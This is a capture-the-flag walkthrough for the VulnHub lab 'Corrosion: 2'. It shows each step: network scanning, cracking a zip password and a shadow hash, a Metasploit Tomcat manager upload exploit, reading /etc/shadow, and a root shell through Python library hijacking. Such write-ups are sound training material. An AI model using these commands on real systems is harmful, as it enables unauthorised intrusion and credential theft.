@@ -1,0 +1,116 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
+            <h1 class="post-title entry-title">Corrosion: 2 VulnHub Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/corrosion-2-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2022-01-23T13:10:16+00:00">January 23, 2022</time><time class="updated" datetime="2025-07-07T17:15:00+00:00">July 7, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Proxy Programmer’s Corrosion: 2 is a Vulnhub medium machine. We can download the lab from <span style="color: #0000ff;"><strong><u><a style="color: #0000ff;" href="https://www.vulnhub.com/entry/corrosion-2,745/">here</a></u></strong></span>. This lab is designed for experienced CTF players who want to put their abilities to the test in a variety of situations. So, let’s get started and see how we can split things down into smaller chunks.</span></p>
+<h3><span style="color: #800000;">Pentest Methodology</span></h3>
+<p><span style="color: #000000;"><strong>Network Scanning </strong></span></p>
+<ul>
+<li><span style="color: #000000;">netdiscover</span></li>
+<li><span style="color: #000000;">nmap</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Enumeration</strong></span></p>
+<ul>
+<li><span style="color: #000000;">dirb</span></li>
+<li><span style="color: #000000;">fcrackzip</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Exploitation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Metasploit</span></li>
+<li><span style="color: #000000;">/etc/shadow</span></li>
+<li><span style="color: #000000;">john</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">ssh</span></li>
+<li><span style="color: #000000;">python library hijacking</span></li>
+<li><span style="color: #000000;">root flag</span></li>
+</ul>
+<p><span style="color: #000000;"><strong> </strong><strong>Level: Medium</strong></span></p>
+<h3><span style="color: #000000;"><span style="color: #800000;">Network Scanning</span> </span></h3>
+<p><span style="color: #000000;">To begin, we must use the <strong>netdiscover</strong> command to scan the network for the target machine’s IP address.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">netdiscover</pre>
+<p><span style="color: #000000;">The victim’s IP address, in this case, is <strong>192.168.1.186</strong>.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjKk1onqg5P0J4wEqrg4ux3lc7rb9UtC8vfivCFdfsIWyQXZff-DFJXiAORTaqsqwTmPZx5nrd9hBDaiG3hPTZ8UFT3Oo0RiIRfuOfWgD2BKtHHR0Nq0fhaqvPcvHjkVgcuaxTZ0q2wAxEeFURQo61PqzudWaID_Dqm0hlbX52eIZ8HGqFFGPxoRxSOug=s16000"/></span></p>
+<p><span style="color: #000000;">Then, we’re going to use <strong>Nmap</strong> to help us move this process along. To see all of the services stated, we need to know which ones are now available.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -sV 192.168.1.186</pre>
+<p><span style="color: #000000;">According to the nmap output, we have:</span></p>
+<ul>
+<li><span style="color: #000000;">An SSH server is available on port 22.</span></li>
+<li><span style="color: #000000;">On port 80, there is an HTTP service (Apache Server).</span></li>
+<li><span style="color: #000000;">On port 8080, a Tomcat server is running on port 8080.</span></li>
+</ul>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjFUCr4h9LxT6BnsA6tAhdUYzdpcVrnUI9dMyHNW65zRm6Odv3JxSeuXttNbWqmF_7wS7PFdHxEd7LJet4JxN_W-1gzH5KvwK_B_l-iy_kPEuy7tdCbx7jj2d3zwAEuGZbHCpC1uyk_tWVxUoDYloT-ssTtryBPvXfFzWJHHfN-N65fZLvmdnLxAySTOw=s16000"/></span></p>
+<h3><span style="color: #800000;">Enumeration</span></h3>
+<p><span style="color: #000000;">Let’s begin by looking at the http service on port <strong>80</strong>. There’s nothing strange about that; it’s just an <strong>Apache server page.</strong></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEj54r-dtA2Td_EreVBny2CnBsqg297VfT88nOhnFmg8CJirwXme8CkHlvtf9Q6mfDTbMAkajh6wNryxyw_eEE6fZTz2rHTC6GOHQ56AnElwXg3auNh8NBw4u7vPpmGpSVx_MstpZgd0WfPykQ0niRWjC7TBGkyyuEw9Z03lW15eJarU_B1iAT74Ikt0cg=s16000"/></span></p>
+<p><span style="color: #000000;">Next, we looked at the <strong>Tomcat server</strong>, which was listening on port <strong>8080</strong>. It’s a straightforward page with nothing suspicious on it.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEh3LcjmoRYHLidzX4MvSY4eMlxzhe02gpg_pLtCWnvdQ2B12kObNphP-JASceSs5iQVxle417G3m2XQBJ6gL_wvhxl4_rOI5tRlsgBlvqbxMFYEG87n9UePZtLcuwhlcAOkwPOFpX8gGCBQ7_1f7fk5wv-HVRJBSFWXJumH-YgbHhN0tfzINefS2mzFyg=s16000"/></span></p>
+<p><span style="color: #000000;">We discovered nothing harmful on websites. So, to continue further in this experiment, we use the <strong>dirb </strong>directory brute force method to find some knowledge. Smash!! We discovered a directory containing a<strong> backup zip file</strong>.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">dirb http://192.168.1.186:8080/ -X .php,.zip</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEivYUcRnvTmVMoAefYSQDiTk8ObWNULLNYpj3evT59FuIoO39u2GOqtfpypZ8-jv676-H0X2UxmF7EgkYr3MtNPplBZlwye3F405YGP522yoZPMV0x8462KI5de3jiyiEMLwb5LE-fmhvMc_sq28uA_qki39HqOKIXOofn_eiFBICTC08GFWfSYJQVQlA=s16000"/></span></p>
+<p><span style="color: #000000;">The <strong>backup zip file</strong> is then downloaded using the <strong>wget </strong>command. Following that, we attempted to study this file, but it was <strong>password protected</strong>.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">wget http://192.168.1.186:8080/backup.zip
+unzip backup.zip</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgM1XNQw9_EzbADCJTb-wlaBJEoQisGsd3EeAY1cBkKj1i2ajrzdytKfXAruWt_CGAiN5V69FQ86WmEUwrxmxDhIZhwn1X9ky52RWBf2PUa_MvNsnLb_9TExlMPwc-g19QJI6Ized9Hg9DVa_MWHLr2yjWk8xWWWCHDYVH4f6t0alPwsRoQ3-qR3SjJDQ=s16000"/></span></p>
+<p><span style="color: #000000;">Then, we’ll use the <strong>fcrackzip</strong> utility to crack this password. It is a lightweight, open-source zip file password cracker. The <strong>rockyou</strong> word-list is used for the brute force attack. Boom!! We cracked its password in a matter of seconds <strong>(@administrator_hi5).</strong></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u backup.zip</pre>
+<p><span style="color: #000000;">Then we use this password to unzip the <strong>backup zip</strong> file. We attempt to inspect each and every file contained in this backup zip file. We are now inspecting the <strong>tomcat users xml</strong> file.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">unzip backup.zip
+cat tomcat-users.xml</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEi9oeyicwDyWMaMCXtq8RGEi-3zD-Socl4-ycbU3avaccjVA8ORsboGgevbnVkWiGfk8NMoIDJaGIpRbwjJ7z-EmNjqn1kD8gJB1e3C0M8UpKEdNYlkSQRr7gkWHQrk0Ms1BO2Nb0BlfHaws77hoHjEk6jp_2_MxRDffc-EyaLM7oJJ1aUNf9wBDpwB0w=s16000"/></span></p>
+<p><span style="color: #000000;">Bam!! We discovered user <strong>admin </strong>and password <strong>melehifokivai </strong>credentials.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiztI5WuE5M1_Sta3tZ4waTHkdHBo0_OI1dj7bTeRexWODqUoJdjAPSScZzecjTDPV6Ku2cn9ut9fN3WL2z2m3WpU-xebq5qyTgwz_VrW2-L9U5NthHKHVmT-exmHL0iyXK-nwbJ4RDFBt2gLPDiVVAjO8v5xdyl4sQV_c66rTZ_10MplcGLch38Pji7g=s16000"/></span></p>
+<h3><span style="color: #800000;">Exploitation</span></h3>
+<p><span style="color: #000000;">Now that we have the credentials, we can begin exploiting them using a <strong>Metasploit</strong>. In these instances, employing a <strong>Tomcat exploit</strong> is the best option. Then give us all the information we need to use it, and we’re ready to go. As you can see, we had a <strong>meterpreter session</strong>.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/multi/http/tomcat_mgr_upload
+set rhosts 192.168.1.186
+set rport 8080
+set httpusername admin
+set httppassword melehifokivai
+exploit</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiGj92boUJBX0CVzYS9bromIAyIbcd9DXHHI4d01HBaoxvecun1NG_gPY2nTe6RJxvxGBL2qejkOXnnfTn1jmnymcOSvCjtqZMgCOM9os9qRN4uh5iMMkBg77kzughkaXU9_3U-Z28d1LAwrryfMKlBmpKhmzHoY1-eoO2FXUxAyIyljhFrdCCI7ISkvg=s16000"/></span></p>
+<p><span style="color: #000000;">All we did was change the directory to home. We learn that Jaye and Randy are the two users in this lab. Jaye was our new user. The password (melehifokivai) is the same as the one we previously discovered.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /home
+ls
+su jaye
+ls</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjLEtiMgoOVz41sveSwTcw9xL7noY5ySUHyHSlBraS1-w31TjtdcEyZzes2B2uXc-as0XWzKUG5Axev7J1nLMUwZaa8koA3yV7GbLeskWw-67iunRaR8LctAP8QMU-nJIbbDCr0_0qCKlppcIT2KVWaJ4vSjjscYEvUW_H25ky34IwIj41uP_FRsHxjCg=s16000"/></span></p>
+<p><span style="color: #000000;">We discovered that this individual has a <strong>look</strong> called the .program that allows us to locate any file. As a result, we use it to locate the <strong>/etc/shadow file</strong>. Boom!! We obtained the <strong>hash values</strong> of all users in this lab.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">./look '' /etc/shadow</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiGjTeUA-Fyk-xVvS2Qql9rYylMJ2p1eIZIGQoFLPa3w5WqxnWajuvmvmcpDC8YiLKaCxCMbUFIm04a0yVRUjz4j0eEvmG9EljhS5yA_OE3iHTESgQXRyup1oXfBN6cIKQiPCpFCk1oLClF6jvQbrFqq6dfT0UJkCgcd5qOdvsyRIwUp0ZmA8QwBiFMcw=s16000"/></span></p>
+<p><span style="color: #000000;">As you are aware, we already have the password for user Jaye. We copy user <strong>randy’s hash value</strong> and save it in a file called hash.</span></p>
+<p><span style="color: #000000;">Using <strong>John,</strong> who is a specialist in this case, we try to crack that hash. In a matter of seconds, we cracked the password <strong>07051986randy.</strong></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">john --wordlist=/usr/share/wordlists/rockyou.txt hash</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiMkuQCR3EMVH468xCy-YLUkoxS79qXoJDul_x_8ztOOx_lRN63aL9tb0p22erD4bjFPFfIuHvLtHKfkREBGJeN3DaxI5J5uHnG_gJJ1OGcueaE8QdN4H3lx4QnNrR73fo3JXPJ4CtBFUDprxT7Q8gWlalTA1myJXtaefyYiv6bjt9SQPqKnyH5NOonJw=s16000"/></span></p>
+<h3><span style="color: #800000;">Privilege Escalation</span></h3>
+<p><span style="color: #000000;">Since, we have all of the necessary information to begin privilege escalation. To login via ssh as user <strong>randy,</strong> we use the cracked password <strong>07051986randy.</strong></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh randy@192.168.1.186</pre>
+<p><span style="color: #000000;">Then we used the <strong>(sudo -l)</strong> tool to examine this user’s limits. We discovered that it can be abused by <strong>python library hijacking</strong>.</span></p>
+<p><span style="color: #000000;">The <strong>randombase64.py</strong> python code can be used to perform this <strong>hijacking</strong>. which imports another file called <strong>base64.</strong></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo -l
+cat /home/randy/randombase64.py</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiGJlFibtP3Rvm68cwnmhjBuC_ZPfKErWxwLaPX3IpTS0i2rrmAvDOCRkAuasFz6HS7Sv5H0b8TeHq6mMcaIr5NAybVRxmRKh8LYjzX3sYsXUgfcqJ5_qRGhAu5YKLKDAHAg5kdpelVpqgU7KKjq3JV00E3V8sRa63JENSNehirkJxVkq7YePWI85nHoA=s16000"/></span></p>
+<p><span style="color: #000000;">To obtain base64 file coordinates, we use the <strong>locate</strong> command. In a couple of seconds, we discover its coordinates. We investigated the file’s restrictions. Using this file, we can gain <strong>root access.</strong></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">locate base64
+ls -la /usr/lib/python3.8/base64.py</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgFMMm8JJSJRUVQJbI1a6sGv641vEY4n2_9nv0MygnQPelYbVgQLIMtsidOL26Js6ezCTVnLUnq4MWmApfRVBpsgXtu-cg4PNnEV04fIbhYlRs7DZ3pDoYp62UUBXQnRtCIcnoXwfS0dwdMSPRufkHZj-9kqlwK2inNAva_heFvzOhvcIVF7t8clgDzQg=s16000"/></span></p>
+<p><span style="color: #000000;">We made some changes to this <strong>base64 python file</strong> using the nano command. Add this code to get <strong>root access</strong> to the victim’s machine.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">import os
+os.system ("/bin/bash")</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEi-6EwkZ9qHj9FD6Wg8PG1pbJnqtf1aZFLv8dqgEKSRI-rD5EuOl59qYmVEiEVPmqC2hJRnk7vgLbFuOAWeXJrCm_8pMIATGcaOFn1h4llwn_0VrI8BdBfb6z3_FRwRp6qCizRwS3C_-7Ja3oOZFUtOJlowQK39jgzKGpMgt53kvIrAtcwGqcpy97b4Vg=s16000"/></strong></span></p>
+<p><span style="color: #000000;">We are now coordinating the use of both <strong>Python files.</strong> Boom!! We obtained root access. Finally we can change the directory to <strong>root </strong>and receive the <strong>root flag</strong> in a matter of seconds.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo /usr/lib/python3.8 /home/randy/randombase64.py
+cd /root
+cat root.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhBRjkN4kBHQLrByzbtz8vywMGjzDtnFEX9Y-W7TGt1PH4BgX7aWC6MsBcOuY0HInPf5JEBCyIKuCcmNT1QCidFWwVwL4QOyJG-NqXH2JyGzMQcEb3kvSk4Ff0L9U0gJ5U5Lydgb-1FjT-oOZ7aCVeWqqrDiReTUU2IVe-CBxrQyRewoPvXo-EUAqgC1g=s16000"/></span></p>
+<p><span style="color: #000000;">This was a fantastic lab with a lot of information, especially in the enumeration and privilege escalation areas. It is worthwhile to attempt to gain CTF experience. Hopefully, this walk-through should have taught you something new.</span></p>
+<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more VulnHub Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/"><span style="color: #0000ff;">Link</span>.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
+<p><span style="color: #000000;"><strong>Author</strong>: Shubham Sharma is a passionate Cybersecurity Researcher, contact <strong><u><a style="color: #000000;" href="https://www.linkedin.com/in/shubham-sharma-626964153/">LinkedIn</a></u></strong> and <strong><u><a style="color: #000000;" href="https://twitter.com/Shubham_pen">Twitter</a></u></strong>.</span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
